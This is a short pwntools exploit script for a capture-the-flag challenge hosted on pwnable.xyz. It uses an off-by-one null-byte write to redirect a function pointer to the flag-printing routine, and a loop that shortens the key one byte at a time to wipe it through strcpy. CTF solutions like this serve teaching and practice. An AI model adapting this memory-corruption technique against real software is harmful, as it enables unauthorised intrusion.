from pwn import *

###Util
def regen_key(length):
    r.sendlineafter('> ','1')
    r.sendlineafter('len: ',str(length))

def load_flag():
    r.sendlineafter('> ','2')

def print_flag(mode='flag'):
    r.sendlineafter('> ','3')
    if mode=='flag':
        r.sendafter('instead? ','n')
        return r.recvline()
    elif mode=='comment':
        r.sendafter('instead? ','y')
        r.sendlineafter('comment: ','M30W')

###Addr
f_do_comment_offset = 0xb1f
real_print_flag_offset = 0xb00


###Exploit
r = remote('svc.pwnable.xyz',30006)

###Off-by-one-NULL to overwrite function ptr from f_do_comment to real_print_flag
print_flag(mode='comment')
regen_key(0x40)
###Shrink key length one byte at a time to leverage strcpy to clear key
for i in range(0x3f,0,-1):
    print(i)
    regen_key(i)
###Load flag and print(only the first byte will be corrupted)
load_flag()
print(print_flag(mode='flag'))

